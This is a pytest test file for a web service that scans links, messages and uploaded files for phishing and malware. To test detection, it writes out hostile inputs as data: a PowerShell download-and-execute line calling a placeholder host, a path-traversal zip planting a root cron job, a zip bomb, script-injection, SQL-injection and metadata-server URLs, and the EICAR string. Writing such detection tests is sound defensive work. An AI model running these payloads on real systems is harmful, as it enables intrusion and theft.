import io
import socket
import threading
import zipfile
from datetime import timedelta
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.analyzers.safe_fetch import Hop, RedirectTrace
from app.analyzers.urls import parse_url
from app.core.config import get_settings
from app.intel import providers
from app.intel.feeds import MALWAREBAZAAR, URLHAUS, FeedIndicator
from app.main import app
from app.models import ScanJob, ThreatSource
from app.models.base import utcnow
from tests.conftest import seed_feed, sign_up

SCANS = "/api/v1/scans"
MALWARE_URL = "http://malware.example.net/payload.exe"
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def scan_url(client: TestClient, url: str) -> dict:
    response = client.post(f"{SCANS}/url", json={"url": url})
    assert response.status_code == 202, response.text
    return response.json()


def scan_file(client: TestClient, name: str, content: bytes) -> dict:
    response = client.post(f"{SCANS}/file", files={"file": (name, content)})
    assert response.status_code == 202, response.text
    return response.json()


def seed_urlhaus(db: Session) -> None:
    seed_feed(
        db,
        URLHAUS,
        [FeedIndicator("url", parse_url(MALWARE_URL).normalized, "malware_download", "exe")],
    )


def reachable(monkeypatch: pytest.MonkeyPatch, *hops: Hop) -> None:
    monkeypatch.setattr(
        "app.analyzers.url_scan.trace_redirects", lambda url: RedirectTrace(hops=list(hops))
    )


# --- Link scans ---------------------------------------------------------------------


def test_url_without_any_reputation_source_is_inconclusive(client: TestClient) -> None:
    scan = scan_url(client, "https://example.org/")
    assert scan["status"] == "inconclusive"
    assert scan["risk"] == "inconclusive"
    unavailable = {c["key"] for c in scan["checks"] if c["status"] == "unavailable"}
    assert {"local_threat_feed", "urlhaus_api"} <= unavailable


def test_clean_url_is_no_known_threat_never_safe(
    client: TestClient, db: Session, monkeypatch: pytest.MonkeyPatch
) -> None:
    seed_urlhaus(db)
    reachable(monkeypatch, Hop(url="https://example.org/", host="example.org", status=200))
    scan = scan_url(client, "https://example.org/")
    assert scan["status"] == "completed"
    assert scan["risk"] == "no_known_threat"
    assert scan["confidence"] != "high"
    assert "guarantee" in scan["summary"]
    assert " safe." not in scan["summary"].replace("it is safe.", "")


def test_url_listed_in_feed_is_known_malicious(client: TestClient, db: Session) -> None:
    seed_urlhaus(db)
    scan = scan_url(client, MALWARE_URL)
    assert scan["risk"] == "known_malicious"
    assert scan["confidence"] == "high"
    top = scan["findings"][0]
    assert top["severity"] == "critical"
    assert top["evidence"]["threat"] == "malware_download"
    assert top["source"] == "urlhaus test feed"


def test_stale_feed_does_not_count_as_a_reputation_check(client: TestClient, db: Session) -> None:
    seed_urlhaus(db)
    source = db.query(ThreatSource).one()
    source.last_success_at = utcnow() - timedelta(hours=get_settings().feed_stale_after_hours + 1)
    db.commit()
    assert scan_url(client, "https://example.org/")["risk"] == "inconclusive"


def test_redirect_to_listed_destination_is_caught(
    client: TestClient, db: Session, monkeypatch: pytest.MonkeyPatch
) -> None:
    seed_urlhaus(db)
    reachable(
        monkeypatch,
        Hop(url="https://bit.ly/abc", host="bit.ly", status=301, location=MALWARE_URL),
        Hop(url=MALWARE_URL, host="malware.example.net", status=200),
    )
    scan = scan_url(client, "https://bit.ly/abc")
    assert scan["risk"] == "known_malicious"
    assert len(scan["details"]["redirect_chain"]) == 2
    assert scan["details"]["final_url"] == MALWARE_URL


def test_lookalike_domain_is_suspicious_even_with_clean_reputation(
    client: TestClient, db: Session
) -> None:
    seed_urlhaus(db)
    scan = scan_url(client, "https://paypall.com/signin")
    assert scan["risk"] == "suspicious"
    assert any(f["category"] == "typosquatting" for f in scan["findings"])


def test_new_domain_is_flagged(
    client: TestClient, db: Session, monkeypatch: pytest.MonkeyPatch
) -> None:
    seed_urlhaus(db)
    monkeypatch.setattr(
        providers, "domain_registration_date", lambda domain: utcnow() - timedelta(days=3)
    )
    scan = scan_url(client, "https://fresh-shop.example.org/")
    assert scan["risk"] == "suspicious"
    assert any(f["category"] == "domain_age" for f in scan["findings"])


def test_internal_targets_are_reported_not_fetched(
    client: TestClient, db: Session, monkeypatch: pytest.MonkeyPatch
) -> None:
    seed_urlhaus(db)
    monkeypatch.undo()  # use the real fetcher: it must refuse on its own
    monkeypatch.setattr(
        providers,
        "domain_registration_date",
        lambda domain: (_ for _ in ()).throw(providers.ProviderUnavailableError("offline")),
    )
    scan = scan_url(client, "http://169.254.169.254/latest/meta-data/")
    assert any(f["category"] == "network" for f in scan["findings"])
    assert scan["details"]["redirect_chain"][0]["status"] is None


@pytest.mark.parametrize("url", ["javascript:alert(1)", "file:///etc/passwd", "", "http://"])
def test_invalid_urls_are_rejected_before_queueing(client: TestClient, url: str) -> None:
    response = client.post(f"{SCANS}/url", json={"url": url})
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "validation_error"


def test_analyzer_crash_is_recorded_as_failed(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    def explode(payload: dict, db: Session) -> None:
        raise RuntimeError("secret internal detail")

    monkeypatch.setitem(__import__("app.scans.runner").scans.runner.ANALYZERS, "url", explode)
    scan = scan_url(client, "https://example.org/")
    assert scan["status"] == "failed"
    assert scan["risk"] is None
    assert "secret internal detail" not in scan["error"]


def test_scan_submissions_are_rate_limited(client: TestClient) -> None:
    responses = [
        client.post(f"{SCANS}/message", json={"content": "hello there, how are you?"})
        for _ in range(61)
    ]
    assert responses[59].status_code == 202
    assert responses[60].status_code == 429
    assert responses[60].json()["error"]["code"] == "rate_limited"


# --- Message scans ------------------------------------------------------------------


def scan_message(client: TestClient, content: str) -> dict:
    response = client.post(f"{SCANS}/message", json={"content": content})
    assert response.status_code == 202, response.text
    return response.json()


def test_phishing_sms_is_suspicious_and_explained(client: TestClient) -> None:
    scan = scan_message(
        client,
        "Your account has been suspended due to unusual activity. Verify your card details "
        "within 24 hours at http://secure-bank.example-login.top/verify",
    )
    assert scan["risk"] == "suspicious"
    found = {f["category"] for f in scan["findings"]}
    assert {"account_threat", "personal_data_request", "urgency"} <= found
    assert scan["details"]["indicators"]["urls"] == ["http://secure-bank.example-login.top/verify"]
    assert all(f["evidence"] for f in scan["findings"] if f["source"].startswith("SENTINEL mess"))


def test_arabic_scam_patterns_are_recognised(client: TestClient) -> None:
    scan = scan_message(
        client, "عزيزي العميل تم إيقاف بطاقتك البنكية، يرجى تحديث بياناتك فوراً عبر الرابط"
    )
    assert scan["risk"] == "suspicious"
    assert {"account_threat", "personal_data_request"} <= {f["category"] for f in scan["findings"]}


def test_otp_request_is_high_severity(client: TestClient) -> None:
    scan = scan_message(client, "Hi, I sent a code to your phone by mistake, please send the OTP")
    assert scan["findings"][0]["severity"] == "high"


def test_ordinary_message_has_no_known_threat(client: TestClient) -> None:
    scan = scan_message(client, "Hi Sam, are we still meeting for lunch on Thursday at noon?")
    assert scan["risk"] == "no_known_threat"
    assert scan["findings"] == []


def test_urgency_alone_does_not_make_a_message_suspicious(client: TestClient) -> None:
    scan = scan_message(client, "Urgent: the team meeting moved to 3pm, please confirm.")
    assert scan["risk"] == "no_known_threat"
    assert [f["severity"] for f in scan["findings"]] == ["low"]


def test_message_with_listed_link_is_known_malicious(client: TestClient, db: Session) -> None:
    seed_urlhaus(db)
    scan = scan_message(client, f"Here is the invoice you asked for: {MALWARE_URL}")
    assert scan["risk"] == "known_malicious"


def test_message_text_is_not_kept_after_the_scan(client: TestClient, db: Session) -> None:
    secret = "my private note 4111-1111 " * 10
    scan = scan_message(client, secret)
    job = db.get(ScanJob, __import__("uuid").UUID(scan["id"]))
    assert job is not None
    assert "content" not in job.payload
    assert len(job.target) <= 81


def test_script_payload_in_message_is_returned_as_plain_data(client: TestClient) -> None:
    payload = "<script>alert(document.cookie)</script> claim your prize now, you have won $500"
    response = client.post(f"{SCANS}/message", json={"content": payload})
    assert response.headers["content-type"] == "application/json"
    assert response.headers["x-content-type-options"] == "nosniff"


def test_short_and_oversized_messages_are_rejected(client: TestClient) -> None:
    assert client.post(f"{SCANS}/message", json={"content": "hi"}).status_code == 422
    assert client.post(f"{SCANS}/message", json={"content": "a" * 10_001}).status_code == 422


# --- File scans ---------------------------------------------------------------------


def make_zip(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def test_file_without_malware_database_is_inconclusive(client: TestClient) -> None:
    scan = scan_file(client, "notes.txt", b"Shopping list: bread, milk, eggs\n")
    assert scan["risk"] == "inconclusive"
    assert scan["details"]["detected_type"] == "Text file"
    assert len(scan["details"]["sha256"]) == 64


def test_clean_file_with_hash_feed_is_no_known_threat(client: TestClient, db: Session) -> None:
    seed_feed(db, MALWAREBAZAAR, [FeedIndicator("sha256", "a" * 64, "malware")])
    scan = scan_file(client, "notes.txt", b"Shopping list: bread, milk, eggs\n")
    assert scan["risk"] == "no_known_threat"
    assert any("static analysis" in limitation for limitation in scan["limitations"])


def test_file_matching_known_hash_is_malicious(client: TestClient, db: Session) -> None:
    import hashlib

    content = b"pretend this is a malware sample"
    seed_feed(
        db, MALWAREBAZAAR, [FeedIndicator("sha256", hashlib.sha256(content).hexdigest(), "malware")]
    )
    assert scan_file(client, "sample.bin", content)["risk"] == "known_malicious"


def test_eicar_test_file_is_detected(client: TestClient) -> None:
    scan = scan_file(client, "eicar.com.txt", EICAR)
    assert scan["risk"] == "known_malicious"
    assert "test" in scan["findings"][0]["title"].lower()


def test_program_disguised_as_document_is_flagged(client: TestClient) -> None:
    scan = scan_file(client, "invoice.pdf.exe", b"MZ" + b"\x00" * 200)
    found = {f["category"] for f in scan["findings"]}
    assert "disguised_file" in found
    assert scan["risk"] == "suspicious"


def test_content_is_trusted_over_the_file_extension(client: TestClient) -> None:
    scan = scan_file(client, "holiday-photo.jpg", b"MZ" + b"\x00" * 200)
    mismatch = next(f for f in scan["findings"] if f["category"] == "type_mismatch")
    assert mismatch["severity"] == "high"
    assert scan["details"]["detected_type"] == "Windows program"


def test_archive_with_path_traversal_entries(client: TestClient) -> None:
    archive = make_zip({"../../etc/cron.d/job": b"* * * * * root id", "readme.txt": b"hi"})
    scan = scan_file(client, "bundle.zip", archive)
    assert any(f["category"] == "path_traversal" for f in scan["findings"])


def test_archive_bomb_is_flagged_without_being_extracted(client: TestClient) -> None:
    archive = make_zip({"zeros.bin": b"\0" * (120 * 1024 * 1024)})
    assert len(archive) < 1024 * 1024
    scan = scan_file(client, "data.zip", archive)
    assert any(f["category"] == "archive_bomb" for f in scan["findings"])


def test_office_document_with_macros(client: TestClient) -> None:
    document = make_zip(
        {
            "[Content_Types].xml": b"<Types/>",
            "word/document.xml": b"<w/>",
            "word/vbaProject.bin": b"x",
        }
    )
    scan = scan_file(client, "report.docm", document)
    assert scan["details"]["detected_type"] == "Word document"
    assert any(f["category"] == "macros" for f in scan["findings"])


def test_pdf_with_auto_running_javascript(client: TestClient) -> None:
    pdf = b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(app.alert(1))>>"
    scan = scan_file(client, "form.pdf", pdf)
    finding = next(f for f in scan["findings"] if f["category"] == "pdf_active_content")
    assert finding["severity"] == "medium"


def test_download_and_execute_script(client: TestClient) -> None:
    script = b"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\n"
    scan = scan_file(client, "setup.ps1", script)
    assert any(f["category"] == "suspicious_script" for f in scan["findings"])


def test_samples_are_deleted_and_stored_under_random_names(
    client: TestClient, upload_dir: Path
) -> None:
    scan = scan_file(client, "../../../etc/passwd", b"harmless text content")
    assert scan["target"] == ".._.._.._etc_passwd"
    assert list(upload_dir.iterdir()) == []


def test_oversized_and_empty_uploads_are_rejected(
    client: TestClient, upload_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "max_upload_bytes", 1024)
    too_big = client.post(f"{SCANS}/file", files={"file": ("big.bin", b"x" * 2048)})
    assert too_big.status_code == 413
    empty = client.post(f"{SCANS}/file", files={"file": ("empty.txt", b"")})
    assert empty.status_code == 422
    assert list(upload_dir.iterdir()) == []


def _fake_clamd(reply: bytes) -> int:
    """A one-shot clamd stand-in that drains an INSTREAM upload and sends a fixed reply."""
    server = socket.create_server(("127.0.0.1", 0))

    def serve() -> None:
        connection, _ = server.accept()
        with connection:
            connection.recv(10)
            while True:
                size = int.from_bytes(connection.recv(4), "big")
                if size == 0:
                    break
                remaining = size
                while remaining:
                    remaining -= len(connection.recv(remaining))
            connection.sendall(reply)
        server.close()

    threading.Thread(target=serve, daemon=True).start()
    return int(server.getsockname()[1])


def test_clamav_detection_is_reported(client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(get_settings(), "clamav_host", "127.0.0.1")
    monkeypatch.setattr(
        get_settings(), "clamav_port", _fake_clamd(b"stream: Win.Test.Sample-1 FOUND\0")
    )
    scan = scan_file(client, "sample.bin", b"some bytes to scan")
    assert scan["risk"] == "known_malicious"
    assert scan["findings"][0]["evidence"]["signature"] == "Win.Test.Sample-1"


def test_clamav_clean_result_allows_a_no_known_threat_verdict(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "clamav_host", "127.0.0.1")
    monkeypatch.setattr(get_settings(), "clamav_port", _fake_clamd(b"stream: OK\0"))
    assert scan_file(client, "notes.txt", b"plain text")["risk"] == "no_known_threat"


def test_unreachable_clamav_is_reported_as_unavailable(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "clamav_host", "127.0.0.1")
    monkeypatch.setattr(get_settings(), "clamav_port", 1)
    scan = scan_file(client, "notes.txt", b"plain text")
    antivirus = next(c for c in scan["checks"] if c["key"] == "antivirus")
    assert antivirus["status"] == "unavailable"
    assert scan["risk"] == "inconclusive"


# --- History, privacy and deletion --------------------------------------------------


def test_history_is_private_filterable_and_deletable(client: TestClient, db: Session) -> None:
    headers = sign_up(client)
    seed_urlhaus(db)
    client.post(f"{SCANS}/url", json={"url": MALWARE_URL}, headers=headers)
    client.post(f"{SCANS}/message", json={"content": "See you at lunch tomorrow?"}, headers=headers)

    history = client.get(f"{SCANS}/history").json()
    assert history["total"] == 2
    flagged = client.get(f"{SCANS}/history", params={"risk": "known_malicious"}).json()
    assert [item["scan_type"] for item in flagged["items"]] == ["url"]
    assert client.get(f"{SCANS}/history", params={"type": "file"}).json()["total"] == 0
    assert client.get(f"{SCANS}/history", params={"type": "x' OR '1'='1"}).status_code == 422

    scan_id = flagged["items"][0]["id"]
    stranger = TestClient(app)
    assert stranger.get(f"{SCANS}/{scan_id}").status_code == 404
    other_headers = sign_up(stranger, "other@example.com")
    assert stranger.get(f"{SCANS}/{scan_id}").status_code == 404
    assert stranger.delete(f"{SCANS}/{scan_id}", headers=other_headers).status_code == 404

    assert client.delete(f"{SCANS}/{scan_id}", headers=headers).status_code == 204
    assert client.get(f"{SCANS}/{scan_id}").status_code == 404
    assert client.delete(f"{SCANS}/history", headers=headers).status_code == 204
    assert client.get(f"{SCANS}/history").json()["total"] == 0


def test_anonymous_scan_is_reachable_by_id_only(client: TestClient) -> None:
    scan = scan_message(client, "Hello, just checking in about the weekend plans.")
    assert scan["saved_to_history"] is False
    assert TestClient(app).get(f"{SCANS}/{scan['id']}").status_code == 200
    assert client.get(f"{SCANS}/00000000-0000-4000-8000-000000000000").status_code == 404


def test_history_can_be_switched_off(client: TestClient) -> None:
    headers = sign_up(client)
    client.patch("/api/v1/user/settings", json={"save_scan_history": False}, headers=headers)
    client.post(f"{SCANS}/message", json={"content": "A message long enough."}, headers=headers)
    assert client.get(f"{SCANS}/history").json()["total"] == 0


def test_overview_export_and_account_deletion(client: TestClient, db: Session) -> None:
    headers = sign_up(client)
    seed_urlhaus(db)
    client.post(f"{SCANS}/url", json={"url": MALWARE_URL}, headers=headers)

    overview = client.get("/api/v1/user/overview").json()
    assert overview["total_scans"] == 1
    assert overview["by_risk"] == {"known_malicious": 1}
    assert overview["daily_activity"][-1] == {
        "date": utcnow().date().isoformat(),
        "total": 1,
        "flagged": 1,
    }

    export = client.get("/api/v1/user/export").json()
    assert export["account"]["email"] == "amira@example.com"
    assert len(export["scans"]) == 1
    assert "password_hash" not in str(export)
    assert "$argon2" not in str(export)

    wrong = client.request(
        "DELETE", "/api/v1/user/account", json={"password": "wrong"}, headers=headers
    )
    assert wrong.status_code == 403
    deleted = client.request(
        "DELETE",
        "/api/v1/user/account",
        json={"password": "correct horse battery"},
        headers=headers,
    )
    assert deleted.status_code == 204
    assert db.query(ScanJob).count() == 0
    assert client.get("/api/v1/auth/session").status_code == 401
